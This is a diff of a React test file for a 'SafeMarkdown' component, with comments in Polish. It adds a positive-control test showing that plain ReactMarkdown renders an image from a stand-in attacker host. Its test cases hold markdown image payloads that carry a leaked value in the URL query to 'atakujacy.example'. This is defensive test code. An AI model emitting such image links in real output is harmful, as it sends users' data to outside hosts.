@@ -8,6 +8,7 @@
 import { readdirSync, readFileSync, statSync } from "node:fs";
 import { join, sep } from "node:path";
 import { render } from "@testing-library/react";
+import ReactMarkdown from "react-markdown";
 import remarkGfm from "remark-gfm";
 import { describe, expect, it, vi } from "vitest";
 import { t } from "@/i18n";
@@ -28,6 +29,16 @@ function md(text: string, components?: SafeMarkdownComponents) {
 }
 
 describe("SafeMarkdown - obrazy nigdy nie tworza <img>", () => {
+    // Kontrola pozytywna (z galezi fix/kurs-aies-fala1, e1795f8): bez niej "brak
+    // <img>" ponizej moglby przechodzic, bo renderer w ogole nie renderuje obrazow
+    // w tym srodowisku. Goly ReactMarkdown MUSI utworzyc <img> z adresem atakujacego.
+    it("kontrola pozytywna: goly ReactMarkdown tworzy <img> z adresu atakujacego", () => {
+        const { container } = render(
+            <ReactMarkdown>{`![logo](https://atakujacy.example/p.png?d=${LEAK})`}</ReactMarkdown>,
+        );
+        expect(container.querySelector("img")?.getAttribute("src")).toContain("atakujacy.example");
+    });
+
     const cases: Array<[string, string]> = [
         ["inline https", `![logo](https://atakujacy.example/p.png?d=${LEAK})`],
         ["reference-style", `![a][r]\n\n[r]: https://atakujacy.example/r.gif?d=${LEAK}`],
